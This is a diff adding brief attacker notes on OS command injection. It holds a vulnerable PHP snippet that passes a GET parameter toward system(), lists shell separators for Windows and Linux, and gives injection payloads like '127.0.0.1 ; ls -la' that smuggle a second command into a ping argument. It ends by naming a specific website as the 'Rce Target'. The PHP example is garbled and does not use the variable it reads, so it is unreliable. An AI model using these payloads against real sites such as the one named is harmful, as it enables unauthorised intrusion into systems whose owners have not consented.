@@ -1,0 +1,35 @@
+Remote Command Execution (RCE) :
+
+
+$ip = $_GET['ip'];
+
+system("ping ls -la");
+Windows :
+			command1 && command2
+			command1 & command2
+			
+Linux:
+		command1 ; command2
+		command1 || command2
+		command1 && command2
+		command1 | command2
+		127.0.0.1 ; ls -la
+		127.0.0.1 && ls -la
+		ali || ls -la
+		127.0.0.1 | ls -la
+		ali | ls -la
+		
+
+system("ping ls -la -n 2");
+		127.0.0.1 ; ls -la ;
+		127.0.0.1 ; ls -la #
+		127.0.0.1 ; ls -la rem
+		
+Rce Target :		
+	https://trulyvision.tnolen1.com/
+
+		
+
+
+
+		
